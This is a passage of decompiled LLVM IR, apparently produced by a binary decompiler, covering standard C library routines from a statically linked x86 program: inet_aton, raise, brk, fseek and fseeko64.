  store i32 %v1_8051f40, i32* @edx, align 4
  %v1_8051f41 = inttoptr i32 %v1_8051f40 to i8*
  %v2_8051f41 = load i8, i8* %v1_8051f41, align 1
  %v3_8051f41 = zext i8 %v2_8051f41 to i32
  %v5_8051f41 = and i32 %v6_8051f4122, -256
  %v6_8051f41 = or i32 %v3_8051f41, %v5_8051f41
  store i32 %v6_8051f41, i32* @ecx, align 4
  %v4_8051f43 = icmp eq i8 %v2_8051f41, 0
  %v1_8051f45 = icmp eq i1 %v4_8051f43, false
  br i1 %v1_8051f45, label %dec_label_pc_8051f3c, label %dec_label_pc_8051f47

dec_label_pc_8051f47:                             ; preds = %dec_label_pc_8051f40, %dec_label_pc_8051f4e
  %v4_8051f41.pre34 = phi i32 [ %v6_8051f4117, %dec_label_pc_8051f4e ], [ %v6_8051f41, %dec_label_pc_8051f40 ]
  %v1_8051f47 = add i32 %v0_8051f4729, 1
  %v1_8051f48 = inttoptr i32 %v1_8051f47 to i8*
  %v2_8051f48 = load i8, i8* %v1_8051f48, align 1
  %v3_8051f48 = zext i8 %v2_8051f48 to i32
  %v5_8051f48 = and i32 %v6_8051f4832, -256
  %v6_8051f48 = or i32 %v3_8051f48, %v5_8051f48
  %v4_8051f4a = icmp eq i8 %v2_8051f48, 0
  br i1 %v4_8051f4a, label %dec_label_pc_8051f52, label %dec_label_pc_8051f4e

dec_label_pc_8051f4e:                             ; preds = %dec_label_pc_8051f4e.lr.ph, %dec_label_pc_8051f47
  %v4_8051f41.pre = phi i32 [ %v4_8051f41.pre.pre, %dec_label_pc_8051f4e.lr.ph ], [ %v4_8051f41.pre34, %dec_label_pc_8051f47 ]
  %v6_8051f4832 = phi i32 [ %v6_8051f4827, %dec_label_pc_8051f4e.lr.ph ], [ %v6_8051f48, %dec_label_pc_8051f47 ]
  %v2_8051f4831 = phi i8 [ %v2_8051f4824, %dec_label_pc_8051f4e.lr.ph ], [ %v2_8051f48, %dec_label_pc_8051f47 ]
  %v0_8051f4729 = phi i32 [ %v4_8051f36, %dec_label_pc_8051f4e.lr.ph ], [ %v1_8051f47, %dec_label_pc_8051f47 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_8051f4114 = load i8, i8* %v1_8051f4113, align 1
  %v3_8051f4115 = zext i8 %v2_8051f4114 to i32
  %v5_8051f4116 = and i32 %v4_8051f41.pre, -256
  %v6_8051f4117 = or i32 %v3_8051f4115, %v5_8051f4116
  store i32 %v6_8051f4117, i32* @ecx, align 4
  %v4_8051f4318 = icmp eq i8 %v2_8051f4114, 0
  %v1_8051f4519 = icmp eq i1 %v4_8051f4318, false
  br i1 %v1_8051f4519, label %dec_label_pc_8051f3c, label %dec_label_pc_8051f47

dec_label_pc_8051f52:                             ; preds = %dec_label_pc_8051f47, %entry
  br label %dec_label_pc_8051f54

dec_label_pc_8051f54:                             ; preds = %dec_label_pc_8051f3c, %dec_label_pc_8051f52
  %v0_8051f56 = phi i32 [ 0, %dec_label_pc_8051f52 ], [ %v0_8051f4729, %dec_label_pc_8051f3c ]
  store i32 %v0_8051f31, i32* @ebx, align 4
  ret i32 %v0_8051f56

; uselistorder directives
  uselistorder i32 %v6_8051f4117, { 2, 0, 1 }
  uselistorder i8 %v2_8051f4114, { 1, 2, 0 }
  uselistorder i32 %v1_8051f47, { 1, 0 }
  uselistorder i32 %v6_8051f41, { 1, 2, 0 }
  uselistorder i8 %v2_8051f41, { 1, 2, 0 }
  uselistorder i32 %v1_8051f40, { 2, 1, 0 }
  uselistorder i8 %v2_8051f4824, { 0, 2, 1 }
  uselistorder i32 %v0_8051f31, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051f54, { 1, 0 }
  uselistorder label %dec_label_pc_8051f4e, { 1, 0 }
  uselistorder label %dec_label_pc_8051f47, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8051f63 = icmp eq i8* %arg1, null
  br i1 %v1_8051f63, label %dec_label_pc_8051fe4, label %dec_label_pc_8051f67

dec_label_pc_8051f67:                             ; preds = %entry
  %v4_8051f5f = ptrtoint i8* %arg1 to i32
  %v0_8051f75.pre = load i32, i32* @global_var_80551a4, align 4
  br label %dec_label_pc_8051f72

dec_label_pc_8051f72:                             ; preds = %dec_label_pc_8051f67, %dec_label_pc_8051fbb
  %v2_8051fbe36 = phi i32 [ 1, %dec_label_pc_8051f67 ], [ %v3_8051fbe, %dec_label_pc_8051fbb ]
  %v0_8051f7235 = phi i32 [ %v4_8051f5f, %dec_label_pc_8051f67 ], [ %v0_8051f724, %dec_label_pc_8051fbb ]
  %v0_8051fd934 = phi i32 [ 0, %dec_label_pc_8051f67 ], [ %v2_8051fc1, %dec_label_pc_8051fbb ]
  %v1_8051f72 = inttoptr i32 %v0_8051f7235 to i8*
  %v2_8051f72 = load i8, i8* %v1_8051f72, align 1
  %v3_8051f72 = sext i8 %v2_8051f72 to i32
  %v2_8051f7b = mul nsw i32 %v3_8051f72, 2
  %v3_8051f7b = add i32 %v2_8051f7b, %v0_8051f75.pre
  %v4_8051f7b = inttoptr i32 %v3_8051f7b to i8*
  %v5_8051f7b = load i8, i8* %v4_8051f7b, align 1
  %v6_8051f7b = and i8 %v5_8051f7b, 8
  %v7_8051f7b = icmp eq i8 %v6_8051f7b, 0
  br i1 %v7_8051f7b, label %dec_label_pc_8051fe4, label %dec_label_pc_8051f82

dec_label_pc_8051f82:                             ; preds = %dec_label_pc_8051f72
  %v4_8051f96.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051f96

dec_label_pc_8051f86:                             ; preds = %dec_label_pc_8051f96
  %v3_8051f86 = mul i32 %v1_8051f86, 10
  %v2_8051f89 = add i32 %v3_8051f86, -48
  %v3_8051f89 = add i32 %v2_8051f89, %v2_8051f98
  %v1_8051f8d = add i32 %v3_8051f89, -255
  %v6_8051f8d = sub i32 254, %v3_8051f89
  %v7_8051f8d = and i32 %v6_8051f8d, %v3_8051f89
  %v8_8051f8d = icmp slt i32 %v7_8051f8d, 0
  %v9_8051f8d = icmp eq i32 %v1_8051f8d, 0
  %v10_8051f8d = icmp slt i32 %v1_8051f8d, 0
  %v3_8051f93 = icmp eq i1 %v10_8051f8d, %v8_8051f8d
  %v4_8051f93 = icmp eq i1 %v9_8051f8d, false
  %v5_8051f93 = and i1 %v4_8051f93, %v3_8051f93
  br i1 %v5_8051f93, label %dec_label_pc_8051fe4, label %dec_label_pc_8051f95

dec_label_pc_8051f95:                             ; preds = %dec_label_pc_8051f86
  %v1_8051f95 = add i32 %v0_8051f95, 1
  br label %dec_label_pc_8051f96

dec_label_pc_8051f96:                             ; preds = %dec_label_pc_8051f82, %dec_label_pc_8051f95
  %v1_8051f86 = phi i32 [ 0, %dec_label_pc_8051f82 ], [ %v3_8051f89, %dec_label_pc_8051f95 ]
  %v4_8051f96 = phi i32 [ %v4_8051f96.pre, %dec_label_pc_8051f82 ], [ %v6_8051f96, %dec_label_pc_8051f95 ]
  %v0_8051f95 = phi i32 [ %v0_8051f7235, %dec_label_pc_8051f82 ], [ %v1_8051f95, %dec_label_pc_8051f95 ]
  %v1_8051f96 = inttoptr i32 %v0_8051f95 to i8*
  %v2_8051f96 = load i8, i8* %v1_8051f96, align 1
  %v3_8051f96 = zext i8 %v2_8051f96 to i32
  %v5_8051f96 = and i32 %v4_8051f96, -256
  %v6_8051f96 = or i32 %v3_8051f96, %v5_8051f96
  store i32 %v6_8051f96, i32* @edx, align 4
  %v2_8051f98 = sext i8 %v2_8051f96 to i32
  %v2_8051f9b = mul nsw i32 %v2_8051f98, 2
  %v3_8051f9b = add i32 %v2_8051f9b, %v0_8051f75.pre
  %v4_8051f9b = inttoptr i32 %v3_8051f9b to i16*
  %v5_8051f9b = load i16, i16* %v4_8051f9b, align 2
  %v2_8051fa0 = and i16 %v5_8051f9b, 8
  %v3_8051fa0 = icmp eq i16 %v2_8051fa0, 0
  %v1_8051fa2 = icmp eq i1 %v3_8051fa0, false
  br i1 %v1_8051fa2, label %dec_label_pc_8051f86, label %dec_label_pc_8051fa4

dec_label_pc_8051fa4:                             ; preds = %dec_label_pc_8051f96
  %v8_8051fa4 = sub nsw i32 2, %v2_8051fbe36
  %v9_8051fa4 = and i32 %v8_8051fa4, %v2_8051fbe36
  %v10_8051fa4 = icmp slt i32 %v9_8051fa4, 0
  %v11_8051fa4 = icmp eq i32 %v2_8051fbe36, 3
  %v12_8051fa4 = icmp slt i32 %v2_8051fbe36, 3
  %v3_8051fa8 = icmp eq i1 %v12_8051fa4, %v10_8051fa4
  %v4_8051fa8 = icmp eq i1 %v11_8051fa4, false
  %v5_8051fa8 = and i1 %v4_8051fa8, %v3_8051fa8
  br i1 %v5_8051fa8, label %dec_label_pc_8051fb2, label %dec_label_pc_8051faa

dec_label_pc_8051faa:                             ; preds = %dec_label_pc_8051fa4
  %v10_8051faa = icmp eq i8 %v2_8051f96, 46
  %v1_8051fad = icmp eq i1 %v10_8051faa, false
  br i1 %v1_8051fad, label %dec_label_pc_8051fe4, label %dec_label_pc_8051faf

dec_label_pc_8051faf:                             ; preds = %dec_label_pc_8051faa
  %v1_8051faf = add i32 %v0_8051f95, 1
  br label %dec_label_pc_8051fbb

dec_label_pc_8051fb2:                             ; preds = %dec_label_pc_8051fa4
  %v1_8051fb2 = add i32 %v0_8051f95, 1
  %v4_8051fb3 = icmp eq i8 %v2_8051f96, 0
  br i1 %v4_8051fb3, label %dec_label_pc_8051fbb, label %dec_label_pc_8051fb7

dec_label_pc_8051fb7:                             ; preds = %dec_label_pc_8051fb2
  %v2_8051fb7 = and i16 %v5_8051f9b, 32
  %v3_8051fb7 = icmp eq i16 %v2_8051fb7, 0
  br i1 %v3_8051fb7, label %dec_label_pc_8051fe4, label %dec_label_pc_8051fbb

dec_label_pc_8051fbb:                             ; preds = %dec_label_pc_8051fb7, %dec_label_pc_8051fb2, %dec_label_pc_8051faf
  %v0_8051f724 = phi i32 [ %v1_8051fb2, %dec_label_pc_8051fb7 ], [ %v1_8051fb2, %dec_label_pc_8051fb2 ], [ %v1_8051faf, %dec_label_pc_8051faf ]
  %v2_8051fbb = mul i32 %v0_8051fd934, 256
  %v3_8051fbe = add nuw nsw i32 %v2_8051fbe36, 1
  %v2_8051fc1 = or i32 %v1_8051f86, %v2_8051fbb
  %v7_8051fc7 = icmp sgt i32 %v2_8051fbe36, 3
  br i1 %v7_8051fc7, label %dec_label_pc_8051fc9, label %dec_label_pc_8051f72

dec_label_pc_8051fc9:                             ; preds = %dec_label_pc_8051fbb
  %v4_8051fce = icmp eq i32 %arg2, 0
  br i1 %v4_8051fce, label %dec_label_pc_8051fe6, label %dec_label_pc_8051fd5

dec_label_pc_8051fd5:                             ; preds = %dec_label_pc_8051fc9
  %v1_8051fd9 = call i32 @llvm.bswap.i32(i32 %v2_8051fc1)
  %v2_8051fdb = inttoptr i32 %arg2 to i32*
  store i32 %v1_8051fd9, i32* %v2_8051fdb, align 4
  br label %dec_label_pc_8051fe6

dec_label_pc_8051fe4:                             ; preds = %dec_label_pc_8051fb7, %dec_label_pc_8051faa, %dec_label_pc_8051f72, %dec_label_pc_8051f86, %entry
  br label %dec_label_pc_8051fe6

dec_label_pc_8051fe6:                             ; preds = %dec_label_pc_8051fc9, %dec_label_pc_8051fd5, %dec_label_pc_8051fe4
  %v0_8051feb = phi i32 [ 1, %dec_label_pc_8051fc9 ], [ 1, %dec_label_pc_8051fd5 ], [ 0, %dec_label_pc_8051fe4 ]
  ret i32 %v0_8051feb

; uselistorder directives
  uselistorder i32 %v2_8051f98, { 1, 0 }
  uselistorder i32 %v6_8051f96, { 1, 0 }
  uselistorder i8 %v2_8051f96, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8051f95, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8051f8d, { 1, 0 }
  uselistorder i32 %v3_8051f89, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8051f7235, { 1, 0 }
  uselistorder i32 %v2_8051fbe36, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 3, 0, 2, 1 }
  uselistorder i8 46, { 0, 2, 1 }
  uselistorder i16 0, { 0, 6, 4, 5, 7, 12, 13, 14, 15, 8, 9, 10, 11, 16, 17, 1, 2, 3 }
  uselistorder i16 8, { 0, 1, 3, 2 }
  uselistorder i32 254, { 1, 0 }
  uselistorder i32 -48, { 3, 2, 1, 0 }
  uselistorder i32 10, { 4, 19, 6, 5, 14, 2, 8, 17, 20, 7, 22, 15, 0, 16, 12, 13, 9, 10, 18, 1, 21, 23, 24, 11, 3 }
  uselistorder i8 8, { 8, 4, 5, 0, 6, 7, 2, 3, 1 }
  uselistorder i8* null, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8051fe6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051fe4, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8051f96, { 1, 0 }
  uselistorder label %dec_label_pc_8051f72, { 1, 0 }
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8051fef = call i32 @__libc_getpid()
  %v2_8051ffb = call i32 @kill(i32 %v0_8051fef, i32 %arg1)
  ret i32 %v2_8051ffb

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 3, 2, 1 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_8052004 = load i32, i32* @eax, align 4
  %v1_8052004 = add i32 %v0_8052004, 28
  %v2_8052004 = inttoptr i32 %v1_8052004 to i32*
  %v3_8052004 = load i32, i32* %v2_8052004, align 4
  store i32 %v3_8052004, i32* @global_var_805b8b8.172, align 8
  %v1_805200d = add i32 %v0_8052004, 44
  %v2_805200d = inttoptr i32 %v1_805200d to i32*
  %v3_805200d = load i32, i32* %v2_805200d, align 4
  store i32 %v3_805200d, i32* @global_var_805b8bc.173, align 4
  ret i32 %v3_805200d
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052018 = load i32, i32* @ebx, align 4
  store i32 %v0_8052018, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_805202b = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_805202b, i32* @global_var_805b49c.163, align 4
  %v7_8052036 = icmp ult i32 %v1_805202b, %arg1
  %v1_8052038 = icmp eq i1 %v7_8052036, false
  br i1 %v1_8052038, label %dec_label_pc_8052048, label %dec_label_pc_805203a

dec_label_pc_805203a:                             ; preds = %entry
  %v0_805203a = load i32, i32* %stack_var_-4, align 4
  %v1_805203a = call i32 @__errno_location(i32 %v0_805203a)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8052042 = inttoptr i32 %v1_805203a to i32*
  store i32 12, i32* %v1_8052042, align 4
  %v0_8052048.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052048

dec_label_pc_8052048:                             ; preds = %entry, %dec_label_pc_805203a
  %v0_8052048 = phi i32 [ 0, %entry ], [ %v0_8052048.pre, %dec_label_pc_805203a ]
  %v2_805204c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805204c, i32* @ebx, align 4
  ret i32 %v0_8052048

; uselistorder directives
  uselistorder i32 %v1_805202b, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 12, { 89, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 122, 15, 27, 82, 88, 28, 29, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 13, 121, 123, 41, 42, 0, 1, 43, 44, 3, 4, 45, 2, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 5, 6, 75, 76, 77, 11, 78, 79, 80, 81, 14, 12, 16, 17, 10, 18, 19, 9, 20, 21, 8, 22, 23, 7, 24, 25, 26, 83, 84, 85, 86, 87 }
  uselistorder i32* @global_var_805b49c.163, { 1, 0, 2 }
  uselistorder i32 45, { 1, 5, 3, 0, 4, 2 }
  uselistorder label %dec_label_pc_8052048, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_805205b = ashr i32 %arg2, 31
  %v4_8052062 = inttoptr i32 %arg1 to i16*
  %v5_8052062 = call i32 @__GI_fseeko64(i16* %v4_8052062, i32 %arg2, i32 %v1_805205b, i32 %arg3)
  ret i32 %v5_8052062
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_805206c = load i32, i32* @ebp, align 4
  %v0_805206d = load i32, i32* @edi, align 4
  %v0_805206e = load i32, i32* @esi, align 4
  %v0_805206f = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_805207f = ptrtoint i16* %arg1 to i32
  store i32 %v4_805207f, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp28 = icmp ult i32 %arg4, 3
  br i1 %tmp28, label %dec_label_pc_80520a3, label %dec_label_pc_8052090

dec_label_pc_8052090:                             ; preds = %entry
  %v1_8052090 = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_8052090, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_8052098 = inttoptr i32 %v1_8052090 to i32*
  store i32 22, i32* %v1_8052098, align 4
  br label %dec_label_pc_8052145

dec_label_pc_80520a3:                             ; preds = %entry
  %v1_80520a3 = add i32 %v4_805207f, 52
  %v2_80520a3 = inttoptr i32 %v1_80520a3 to i32*
  %v3_80520a3 = load i32, i32* %v2_80520a3, align 4
  %v1_80520a6 = icmp eq i32 %v3_80520a3, 0
  %v1_80520a8 = icmp eq i1 %v1_80520a6, false
  br i1 %v1_80520a8, label %dec_label_pc_80520c9, label %dec_label_pc_80520aa

dec_label_pc_80520aa:                             ; preds = %dec_label_pc_80520a3
  %v1_80520aa = add i32 %v4_805207f, 56
  store i32 %v1_80520aa, i32* @ebx, align 4
  %v2_80520b4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_80520b4, i32* @eax, align 4
  %v3_80520b9 = call i32 @__pthread_return_void(i32 %v2_80520b4, i32 134548959)
  store i32 %v3_80520b9, i32* %eax.global-to-local, align 4
  %v0_80520be = load i32, i32* @ebx, align 4
  %v2_80520c1 = call i32 @__pthread_return_0(i32 %v0_80520be)
  store i32 %v2_80520c1, i32* %eax.global-to-local, align 4
  %v0_80520c9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80520c9

dec_label_pc_80520c9:                             ; preds = %dec_label_pc_80520a3, %dec_label_pc_80520aa
  %v0_80520d1 = phi i32 [ %v4_805207f, %dec_label_pc_80520a3 ], [ %v0_80520c9.pre, %dec_label_pc_80520aa ]
  %v1_80520c9 = inttoptr i32 %v0_80520d1 to i8*
  %v2_80520c9 = load i8, i8* %v1_80520c9, align 1
  %v3_80520c9 = and i8 %v2_80520c9, 64
  %v4_80520c9 = icmp eq i8 %v3_80520c9, 0
  br i1 %v4_80520c9, label %dec_label_pc_80520de, label %dec_label_pc_80520ce

dec_label_pc_80520ce:                             ; preds = %dec_label_pc_80520c9
  %v2_80520d2 = call i32 @__stdio_wcommit(i32 %v0_80520d1)
  store i32 %v2_80520d2, i32* %eax.global-to-local, align 4
  %v1_80520da = icmp eq i32 %v2_80520d2, 0
  %v1_80520dc = icmp eq i1 %v1_80520da, false
  br i1 %v1_80520dc, label %dec_label_pc_805212d, label %dec_label_pc_80520de

dec_label_pc_80520de:                             ; preds = %dec_label_pc_80520ce, %dec_label_pc_80520c9
  %v0_80520de = load i32, i32* @edi, align 4
  %v9_80520de = icmp eq i32 %v0_80520de, 1
  %v1_80520e1 = icmp eq i1 %v9_80520de, false
  br i1 %v1_80520e1, label %dec_label_pc_80520de.dec_label_pc_80520f7_crit_edge, label %dec_label_pc_80520e3

dec_label_pc_80520de.dec_label_pc_80520f7_crit_edge: ; preds = %dec_label_pc_80520de
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_80520f7

dec_label_pc_80520e3:                             ; preds = %dec_label_pc_80520de
  %v0_80520e3 = load i32, i32* @ecx, align 4
  %v2_80520e5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_80520e5, i32* %eax.global-to-local, align 4
  %v0_80520ea = load i32, i32* @esi, align 4
  %tmp26 = inttoptr i32 %v0_80520ea to i32*
  %v6_80520eb = call i32 @__stdio_adjust_position(i32* %tmp26, i32 %v2_80520e5, i32 %v0_80520e3, i32 %v0_80520e3)
  store i32 %v6_80520eb, i32* %eax.global-to-local, align 4
  %v2_80520f3 = icmp slt i32 %v6_80520eb, 0
  br i1 %v2_80520f3, label %dec_label_pc_805212d, label %dec_label_pc_80520e3.dec_label_pc_80520f7_crit_edge

dec_label_pc_80520e3.dec_label_pc_80520f7_crit_edge: ; preds = %dec_label_pc_80520e3
  %v0_80520f8.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80520f7

dec_label_pc_80520f7:                             ; preds = %dec_label_pc_80520de.dec_label_pc_80520f7_crit_edge, %dec_label_pc_80520e3.dec_label_pc_80520f7_crit_edge
  %v2_80520f9.pre-phi = phi i32 [ %.pre6, %dec_label_pc_80520de.dec_label_pc_80520f7_crit_edge ], [ %v2_80520e5, %dec_label_pc_80520e3.dec_label_pc_80520f7_crit_edge ]
  %v0_80520f8 = phi i32 [ %v0_80520de, %dec_label_pc_80520de.dec_label_pc_80520f7_crit_edge ], [ %v0_80520f8.pre, %dec_label_pc_80520e3.dec_label_pc_80520f7_crit_edge ]
  %v0_80520f7 = load i32, i32* @edx, align 4
  store i32 %v2_80520f9.pre-phi, i32* %eax.global-to-local, align 4
  %v0_80520fe = load i32, i32* @esi, align 4
  %v5_80520ff = inttoptr i32 %v2_80520f9.pre-phi to i32*
  %v6_80520ff = call i32 @__stdio_seek(i32 %v0_80520fe, i32* %v5_80520ff, i32 %v0_80520f8, i32 %v0_80520f7)
  store i32 %v6_80520ff, i32* %eax.global-to-local, align 4
  %v2_8052107 = icmp slt i32 %v6_80520ff, 0
  br i1 %v2_8052107, label %dec_label_pc_805212d, label %dec_label_pc_805210b

dec_label_pc_805210b:                             ; preds = %dec_label_pc_80520f7
  %v0_805210b = load i32, i32* @esi, align 4
  %v1_805210b = inttoptr i32 %v0_805210b to i16*
  %v2_805210b = load i16, i16* %v1_805210b, align 2
  %v3_805210b = and i16 %v2_805210b, -72
  store i16 %v3_805210b, i16* %v1_805210b, align 2
  %v0_805210f = load i32, i32* @esi, align 4
  %v1_805210f = add i32 %v0_805210f, 8
  %v2_805210f = inttoptr i32 %v1_805210f to i32*
  %v3_805210f = load i32, i32* %v2_805210f, align 4
  store i32 %v3_805210f, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v2_8052114 = add i32 %v0_805210f, 16
  %v3_8052114 = inttoptr i32 %v2_8052114 to i32*
  store i32 %v3_805210f, i32* %v3_8052114, align 4
  %v0_8052117 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052117 = load i32, i32* @esi, align 4
  %v2_8052117 = add i32 %v1_8052117, 20
  %v3_8052117 = inttoptr i32 %v2_8052117 to i32*
  store i32 %v0_8052117, i32* %v3_8052117, align 4
  %v0_805211a = load i32, i32* %eax.global-to-local, align 4
  %v1_805211a = load i32, i32* @esi, align 4
  %v2_805211a = add i32 %v1_805211a, 24
  %v3_805211a = inttoptr i32 %v2_805211a to i32*
  store i32 %v0_805211a, i32* %v3_805211a, align 4
  %v0_805211d = load i32, i32* %eax.global-to-local, align 4
  %v1_805211d = load i32, i32* @esi, align 4
  %v2_805211d = add i32 %v1_805211d, 28
  %v3_805211d = inttoptr i32 %v2_805211d to i32*
  store i32 %v0_805211d, i32* %v3_805211d, align 4
  %v0_8052120 = load i32, i32* @esi, align 4
  %v1_8052120 = add i32 %v0_8052120, 44
  %v2_8052120 = inttoptr i32 %v1_8052120 to i32*
  store i32 0, i32* %v2_8052120, align 4
  %v0_8052127 = load i32, i32* @esi, align 4
  %v1_8052127 = add i32 %v0_8052127, 2
  %v2_8052127 = inttoptr i32 %v1_8052127 to i8*
  store i8 0, i8* %v2_8052127, align 1
  br label %dec_label_pc_8052130

dec_label_pc_805212d:                             ; preds = %dec_label_pc_80520f7, %dec_label_pc_80520e3, %dec_label_pc_80520ce
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052130

dec_label_pc_8052130:                             ; preds = %dec_label_pc_805210b, %dec_label_pc_805212d
  br i1 %v1_80520a8, label %dec_label_pc_8052145, label %dec_label_pc_8052134

dec_label_pc_8052134:                             ; preds = %dec_label_pc_8052130
  %v2_8052138 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8052138, i32* @eax, align 4
  %v3_805213d = call i32 @__pthread_return_void(i32 %v2_8052138, i32 1)
  store i32 %v3_805213d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052145

dec_label_pc_8052145:                             ; preds = %dec_label_pc_8052130, %dec_label_pc_8052090, %dec_label_pc_8052134
  %v0_8052148 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8052148, i32* %eax.global-to-local, align 4
  store i32 %v0_805206f, i32* @ebx, align 4
  store i32 %v0_805206e, i32* @esi, align 4
  store i32 %v0_805206d, i32* @edi, align 4
  store i32 %v0_805206c, i32* @ebp, align 4
  ret i32 %v0_8052148

; uselistorder directives
  uselistorder i32 %v2_80520f9.pre-phi, { 1, 0 }
  uselistorder i32 %v0_80520de, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 28, { 4, 17, 5, 3, 6, 7, 8, 9, 10, 11, 12, 0, 13, 18, 14, 15, 1, 2, 16 }
  uselistorder i32 24, { 21, 22, 18, 19, 34, 20, 23, 24, 25, 26, 27, 28, 29, 35, 15, 30, 31, 32, 33, 16, 17, 12, 10, 11, 8, 9, 6, 7, 4, 5, 2, 3, 13, 0, 1, 14 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8 64, { 1, 2, 3, 0 }
  uselistorder i32 (i32)* @__pthread_return_0, { 11, 3, 8, 13, 12, 7, 2, 1, 0, 6, 5, 10, 4, 9 }
  uselistorder i32 (i32, i32)* @__pthread_return_void, { 15, 14, 1, 0, 9, 8, 19, 18, 17, 16, 7, 6, 5, 4, 3, 2, 13, 12, 11, 10 }
  uselistorder i32 56, { 2, 1, 0, 3, 5, 4 }
  uselistorder i32 52, { 1, 0, 5, 6, 2, 3, 7, 4 }
  uselistorder i32 22, { 6, 11, 2, 3, 4, 5, 7, 10, 8, 9, 12, 0, 1 }
  uselistorder i32* @esi, { 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 6, 58, 59, 161, 162, 163, 164, 165, 219, 220, 221, 222, 60, 61, 62, 63, 0, 64, 188, 189, 190, 223, 224, 225, 226, 227, 235, 238, 239, 240, 65, 66, 67, 68, 69, 70, 71, 228, 233, 234, 40, 41, 42, 43, 176, 177, 178, 1, 179, 180, 181, 44, 45, 46, 47, 191, 195, 7, 196, 197, 198, 199, 200, 201, 202, 192, 193, 194, 203, 204, 205, 206, 207, 208, 209, 2, 210, 211, 212, 213, 8, 214, 22, 215, 216, 217, 218, 148, 149, 150, 151, 152, 241, 9, 242, 243, 72, 10, 73, 23, 20, 74, 186, 187, 250, 251, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 12, 91, 3, 93, 94, 95, 96, 11, 97, 98, 92, 99, 100, 101, 102, 4, 103, 104, 105, 106, 107, 108, 21, 13, 109, 110, 14, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 15, 128, 129, 130, 16, 39, 111, 5, 112, 113, 17, 18, 131, 229, 230, 231, 232, 244, 245, 246, 247, 248, 249, 132, 133, 19, 134, 135, 236, 237, 184, 185, 136, 137, 138, 139, 140, 143, 141, 142, 144, 145, 146, 147, 153, 154, 155, 156, 157, 158, 159, 160, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 182, 183, 252 }
